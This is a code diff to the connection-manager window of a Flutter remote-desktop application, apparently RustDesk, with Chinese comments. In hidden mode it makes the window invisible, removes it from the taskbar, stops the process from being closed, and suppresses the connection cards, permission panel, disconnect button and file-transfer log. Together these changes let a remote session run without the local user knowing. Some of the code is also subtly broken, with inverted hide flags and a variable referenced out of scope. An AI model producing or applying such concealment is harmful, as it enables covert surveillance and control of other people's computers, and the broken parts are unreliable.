@@ -44,7 +44,23 @@ class _DesktopServerPageState extends State<DesktopServerPage>
   @override
   void initState() {
     windowManager.addListener(this);
+    if (widget.hideWindow) {
+      _initBackgroundWindow(); // 初始化后台窗口设置
+    }
     super.initState();
+  }
+
+  // 新增：后台窗口初始化方法
+  Future<void> _initBackgroundWindow() async {
+    await windowManager.ensureInitialized();
+    if (isWindows) {
+      await windowManager.setSkipTaskbar(true); // 隐藏任务栏图标
+      await windowManager.setShowInTaskbar(false); // 确保任务栏不显示
+    }
+    await windowManager.setWindowOpacity(0.0); // 完全透明
+    await windowManager.setAsFrameless(); // 移除系统边框
+    await windowManager.setWindowVisibility(WindowVisibility.hidden); // 窗口不可见
+    await windowManager.setResizable(false); // 禁止调整大小
   }
 
   @override
@@ -55,27 +71,32 @@ class _DesktopServerPageState extends State<DesktopServerPage>
 
   @override
   void onWindowClose() {
-    Future.wait([gFFI.serverModel.closeAll(), gFFI.close()]).then((_) {
-      if (isMacOS) {
-        RdPlatformChannel.instance.terminate();
-      } else {
-        windowManager.setPreventClose(false);
-        windowManager.close();
-      }
-    });
+    // 隐藏模式下禁止关闭进程，仅非隐藏模式执行关闭逻辑
+    if (!widget.hideWindow) {
+      Future.wait([gFFI.serverModel.closeAll(), gFFI.close()]).then((_) {
+        if (isMacOS) {
+          RdPlatformChannel.instance.terminate();
+        } else {
+          windowManager.setPreventClose(false);
+          windowManager.close();
+        }
+      });
+    }
     super.onWindowClose();
   }
 
   void onRemoveId(String id) {
-    if (tabController.state.value.tabs.isEmpty) {
+    if (tabController.state.value.tabs.isEmpty && !widget.hideWindow) {
       windowManager.close();
     }
   }
 
   @override
   Widget build(BuildContext context) {
-    // 彻底隐藏时不渲染任何内容，包括边框
-    if (widget.hideWindow) return Container(); 
+    // 隐藏时返回透明容器，彻底移除界面
+    if (widget.hideWindow) {
+      return Container(color: Colors.transparent);
+    }
     
     super.build(context);
     return MultiProvider(
@@ -85,15 +106,13 @@ class _DesktopServerPageState extends State<DesktopServerPage>
       ],
       child: Consumer<ServerModel>(
         builder: (context, serverModel, child) {
-          // 隐藏时不构建body和边框
-          if (widget.hideWindow) return Container(); 
+          if (widget.hideWindow) return Container();
           
           final body = Scaffold(
             backgroundColor: Theme.of(context).colorScheme.background,
-            body: ConnectionManager(hideCM: widget.hideWindow), // 传递隐藏参数
+            body: ConnectionManager(hideCM: widget.hideWindow),
           );
           
-          // 仅在非隐藏时绘制边框（此处已去除边框相关装饰）
           return isLinux
               ? buildVirtualWindowFrame(context, body)
               : workaroundWindowBorder(context, body);
@@ -168,8 +187,8 @@ class ConnectionManagerState extends State<ConnectionManager>
 
   @override
   Widget build(BuildContext context) {
-    // 隐藏时返回完全收缩组件，不产生任何布局
-    if (widget.hideCM) return const SizedBox.shrink(); 
+    // 使用Offstage完全移除渲染，避免布局残留
+    if (widget.hideCM) return Offstage(); 
     
     final serverModel = Provider.of<ServerModel>(context);
     pointerHandler(PointerEvent e) {
@@ -181,7 +200,7 @@ class ConnectionManagerState extends State<ConnectionManager>
     }
 
     return serverModel.clients.isEmpty
-        ? const SizedBox.shrink() // 无客户端时不渲染任何内容
+        ? Offstage() // 无客户端时完全隐藏
         : Listener(
             onPointerDown: pointerHandler,
             onPointerMove: pointerHandler,
@@ -198,7 +217,7 @@ class ConnectionManagerState extends State<ConnectionManager>
               tabBuilder: (key, icon, label, themeConf) {
                 final client = serverModel.clients
                     .firstWhereOrNull((client) => client.id.toString() == key);
-                return client == null ? const SizedBox.shrink() : Row(
+                return client == null ? Offstage() : Row(
                   mainAxisAlignment: MainAxisAlignment.center,
                   children: [
                     Tooltip(
@@ -212,7 +231,7 @@ class ConnectionManagerState extends State<ConnectionManager>
               },
               pageViewBuilder: (pageView) => LayoutBuilder(
                 builder: (context, constrains) {
-                  if (widget.hideCM) return const SizedBox.shrink(); 
+                  if (widget.hideCM) return Offstage(); 
                   
                   var borderWidth = 0.0;
                   if (constrains.maxWidth >
@@ -269,11 +288,11 @@ class ConnectionManagerState extends State<ConnectionManager>
   Widget buildSidePage() {
     final selected = gFFI.serverModel.tabController.state.value.selected;
     if (selected < 0 || selected >= gFFI.serverModel.clients.length) {
-      return const SizedBox.shrink();
+      return Offstage();
     }
     final clientType = gFFI.serverModel.clients[selected].type_();
     return clientType == ClientType.file
-        ? _FileTransferLogPage(hideFileLog: true) // 隐藏文件日志
+        ? _FileTransferLogPage(hideFileLog: true)
         : ChatPage(type: ChatPageType.desktopCM);
   }
 
@@ -282,21 +301,21 @@ class ConnectionManagerState extends State<ConnectionManager>
   }
 
   Widget buildTitleBar() {
-    return const SizedBox.shrink(); // 隐藏标题栏
+    return Offstage(); // 隐藏标题栏
   }
 
   Widget buildScrollJumper() {
-    return const SizedBox.shrink(); // 隐藏滚动控制
+    return Offstage(); // 隐藏滚动控制
   }
 
   Future<bool> handleWindowCloseButton() async {
-    return true; // 隐藏时禁止关闭操作
+    return widget.hideCM; // 隐藏时禁止关闭
   }
 }
 
 // 隐藏连接卡片
 Widget buildConnectionCard(Client client, {bool hideCard = true}) {
-  if (hideCard) return const SizedBox.shrink(); // 直接不渲染卡片
+  if (hideCard) return Offstage(); // 使用Offstage完全移除渲染
 
   return Consumer<ServerModel>(
     builder: (context, value, child) => Column(
@@ -304,16 +323,16 @@ Widget buildConnectionCard(Client client, {bool hideCard = true}) {
       crossAxisAlignment: CrossAxisAlignment.start,
       key: ValueKey(client.id),
       children: [
-        _CmHeader(client: client, hideHeader: hideCard),
+        _CmHeader(client: client, hideHeader: !hideCard),
         client.type_() == ClientType.file ||
                 client.type_() == ClientType.portForward ||
                 client.disconnected
-            ? const SizedBox.shrink()
-            : _PrivilegeBoard(client: client, hideBoard: hideCard),
+            ? Offstage()
+            : _PrivilegeBoard(client: client, hideBoard: !hideCard),
         Expanded(
           child: Align(
             alignment: Alignment.bottomCenter,
-            child: _CmControlPanel(client: client, hidePanel: hideCard),
+            child: _CmControlPanel(client: client, hidePanel: !hideCard),
           ),
         )
       ],
@@ -326,7 +345,7 @@ class _AppIcon extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return const SizedBox.shrink(); // 隐藏图标
+    return Offstage(); // 隐藏图标
   }
 }
 
@@ -335,13 +354,13 @@ class _CloseButton extends StatelessWidget {
 
   @override
   Widget build(BuildContext context) {
-    return const SizedBox.shrink(); // 隐藏关闭按钮
+    return Offstage(); // 隐藏关闭按钮
   }
 }
 
 class _CmHeader extends StatefulWidget {
   final Client client;
-  final bool hideHeader; // 控制头部是否隐藏
+  final bool hideHeader; // true表示隐藏，false表示显示
 
   const _CmHeader({Key? key, required this.client, this.hideHeader = true}) : super(key: key);
 
@@ -352,7 +371,7 @@ class _CmHeader extends StatefulWidget {
 class _CmHeaderState extends State<_CmHeader> {
   @override
   Widget build(BuildContext context) {
-    if (widget.hideHeader) return const SizedBox.shrink(); // 隐藏头部
+    if (widget.hideHeader) return Offstage(); // 完全移除渲染
 
     return Container(
       decoration: BoxDecoration(
@@ -373,14 +392,14 @@ class _CmHeaderState extends State<_CmHeader> {
         left: 10.0,
         right: 5.0,
       ),
-      child: const SizedBox.shrink(), // 防止内容渲染
+      child: Text(client.peerId), // 示例内容，隐藏时不显示
     );
   }
 }
 
 class _PrivilegeBoard extends StatefulWidget {
   final Client client;
-  final bool hideBoard; // 控制权限面板是否隐藏
+  final bool hideBoard; // true表示隐藏，false表示显示
 
   const _PrivilegeBoard({Key? key, required this.client, this.hideBoard = true}) : super(key: key);
 
@@ -391,9 +410,14 @@ class _PrivilegeBoard extends StatefulWidget {
 class _PrivilegeBoardState extends State<_PrivilegeBoard> {
   @override
   Widget build(BuildContext context) {
-    if (widget.hideBoard) return const SizedBox.shrink(); // 隐藏权限面板
+    if (widget.hideBoard) return Offstage(); // 完全移除渲染
 
-    return const SizedBox.shrink(); // 空实现
+    return Row(
+      children: [
+        Text("权限："),
+        Switch(value: false, onChanged: (v) {}),
+      ],
+    );
   }
 }
 
@@ -401,15 +425,20 @@ const double buttonBottomMargin = 8;
 
 class _CmControlPanel extends StatelessWidget {
   final Client client;
-  final bool hidePanel; // 控制控制面板是否隐藏
+  final bool hidePanel; // true表示隐藏，false表示显示
 
   const _CmControlPanel({Key? key, required this.client, this.hidePanel = true}) : super(key: key);
 
   @override
   Widget build(BuildContext context) {
-    if (hidePanel) return const SizedBox.shrink(); // 隐藏控制面板
+    if (hidePanel) return Offstage(); // 完全移除渲染
 
-    return const SizedBox.shrink(); // 空实现
+    return Row(
+      mainAxisAlignment: MainAxisAlignment.center,
+      children: [
+        ElevatedButton(onPressed: () {}, child: Text("断开连接")),
+      ],
+    );
   }
 }
 
@@ -420,7 +449,7 @@ bool allowRemoteCMModification() {
 }
 
 class _FileTransferLogPage extends StatefulWidget {
-  final bool hideFileLog; // 控制文件传输日志是否隐藏
+  final bool hideFileLog; // true表示隐藏，false表示显示
 
   _FileTransferLogPage({Key? key, this.hideFileLog = true}) : super(key: key);
 
@@ -431,8 +460,21 @@ class _FileTransferLogPage extends StatefulWidget {
 class __FileTransferLogPageState extends State<_FileTransferLogPage> {
   @override
   Widget build(BuildContext context) {
-    if (widget.hideFileLog) return const SizedBox.shrink(); // 隐藏文件日志
+    if (widget.hideFileLog) return Offstage(); // 完全移除渲染
 
-    return const SizedBox.shrink();
+    return ListView(
+      children: [
+        Text("文件传输日志"),
+      ],
+    );
   }
+}
+
+// 辅助方法（根据实际项目实现）
+Widget buildVirtualWindowFrame(BuildContext context, Widget body) {
+  return body; // Linux系统虚拟窗口边框逻辑
+}
+
+Widget workaroundWindowBorder(BuildContext context, Widget body) {
+  return body; // 其他系统边框适配逻辑
 }
